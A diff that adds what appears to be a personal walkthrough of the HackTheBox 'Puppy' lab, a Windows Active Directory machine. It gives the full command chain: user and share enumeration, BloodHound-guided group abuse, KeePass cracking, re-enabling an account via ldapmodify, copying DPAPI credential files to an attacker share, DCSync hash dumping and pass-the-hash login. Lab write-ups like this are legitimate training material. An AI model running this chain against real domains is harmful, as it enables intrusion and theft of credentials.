@@ -1,1 +1,199 @@
+# Puppy HTB – Pentest Walkthrough
 
+**Target:** Windows Machine  
+
+---
+
+##  Reconnaissance
+
+Started with Nmap to scan open ports and services:
+
+nmap -sC -sV 10.10.11.70
+
+
+- Found **port 5985 (WinRM)** open (prime target for exploitation).  
+- Provided credentials:  
+
+levi.james : KingofAkron2025!
+
+
+---
+
+## User Enumeration
+
+Using `rpcclient` to dump users:
+
+rpcclient -U "" 10.10.11.70
+
+
+Users discovered:
+
+Administrator
+Guest
+krbtgt
+levi.james
+ant.edwards
+adam.silver
+jamie.williams
+steph.cooper
+steph.cooper_adm
+
+
+---
+
+## SMB Share Enumeration
+
+`SMBMap` results:
+
+| Share        | Access Level | Notes                               |
+|--------------|-------------|------------------------------------|
+| ADMIN$       | No Access   | Remote Admin                       |
+| C$           | No Access   | Default Admin Share                |
+| DEV          | No Access   | **Custom Developer Share 🚨**     |
+| IPC$         | Read Only   | Remote IPC                         |
+| NETLOGON     | Read Only   | Logon Server Share                 |
+| SYSVOL       | Read Only   | Default Domain Share               |
+
+The custom **DEV** share stands out as interesting.
+
+---
+
+## BloodHound Setup
+
+BloodHound initially threw a **ClockSkew** error.  
+Fixed with:
+
+sudo ntpdate puppy.htb
+
+
+With time synced, BloodHound worked fine.
+
+---
+
+## Privilege Escalation Path: Levi.James
+
+BloodHound analysis revealed `levi.james` had write access to the **Developers group**.
+
+Command used to add Levi to the group:
+
+bloody-AD --host '10.xx.xx.xx' -d 'dc.puppy.htb'
+-u 'levi.james' -p 'KingofAkron2025!'
+add groupMember DEVELOPERS levi.james
+
+
+Levi is now a **Developer**.
+
+---
+
+## DEV Share Loot
+
+Connected:
+
+smbclient //10.10.11.70/DEV -U levi.james
+
+
+Found:
+
+KeePassXC-2.7.9-Win64.msi
+Projects/
+recovery.kdbx
+tiCPYdaK.exe
+
+
+The `recovery.kdbx` KeePass DB looked promising.
+
+---
+
+## KeePass Crack
+
+Used `keepass4brute.sh` with `rockyou.txt` to crack:
+
+[*] Password found: liverpool
+
+
+DB revealed **additional credentials**, including for `ant.edwards`.
+
+---
+
+## Pivot to Ant.Edwards
+
+Creds:
+
+ant.edwards : Antman2025!
+
+
+BloodHound showed `ant.edwards` had **Full Control over adam.silver**.
+
+---
+
+## Enabling Adam.Silver
+
+Adam’s account was disabled.  
+Fixed with `ldapsearch` + `ldapmodify`:
+
+```bash
+ldapmodify -x -H ldap://10.10.11.70 -D "ANT.EDWARDS@PUPPY.HTB" -W << EOF
+dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
+changetype: modify
+replace: userAccountControl
+userAccountControl: 66048
+EOF
+
+Logged in with Evil-WinRM and grabbed user.txt.
+ Privilege Escalation
+Backup Files
+
+Found site-backup-2024-12-30.zip.
+Extracted credentials:
+
+steph.cooper : ChefSteph2025!
+
+DPAPI Credential Dump
+
+Copied credential files over SMB:
+
+copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\...\556a2412..." \\10.xx.xx.xx\share\masterkey
+copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69E..." \\10.xx.xx.xx\share\credential
+
+Decrypted:
+
+impacket-dpapi masterkey -file masterkey_blob -password 'ChefSteph2025!'
+impacket-dpapi credential -file credential -key <MASTERKEY>
+
+Result:
+
+steph.cooper_adm : FivethChipOnItsWay2025!
+
+DCSync Rights
+
+BloodHound revealed steph.cooper_adm had DCSync rights.
+
+Dumped NTDS hashes and retrieved Administrator’s hash.
+ Root Access
+
+Logged in as Administrator:
+
+evil-winrm -i 10.10.11.70 -u 'Administrator' -H '<REDACTED>'
+
+Navigated to the desktop and grabbed root.txt.
+Rooted!
+Key Takeaways
+
+    Enumeration is everything. This is something I've been learning a TON about, and have constanly in mind 
+    when performing any of my test/CTF challenges!
+    Using your resources (The internet) is a great way to loosen any confusion and gain better insight on your
+    current facing problems. This is something I'm trying to keep in mind aswell. 
+
+    DPAPI secrets + BloodHound = domination. I find this trick is quite usefull most of the time when 
+    testing a Windows machine, but it's not the only one that works well! the key is to be adaptable, so 
+    learning a myriad of methods of exploitation is key!
+
+    DCSync is essentially a direct path to full domain compromise. It’s a critical security risk 
+    because it allows an attacker to impersonate a Domain Controller and request password hashes 
+    for any user in Active Directory—including domain admins and service accounts. Once an attacker 
+    gains DCSync rights, they can dump every user’s NTLM hash from the domain and use them to assume 
+    full control of the AD environment. This box demonstrated the severity of DCSync perfectly.
+
+    This box was a great showcase of pivoting across multiple accounts, 
+    and im starting to feel really comfortable and familiar with different ways to exploit AD, 
+    how to gain access, and pivot from lower-level accounts to more privileged accounts.
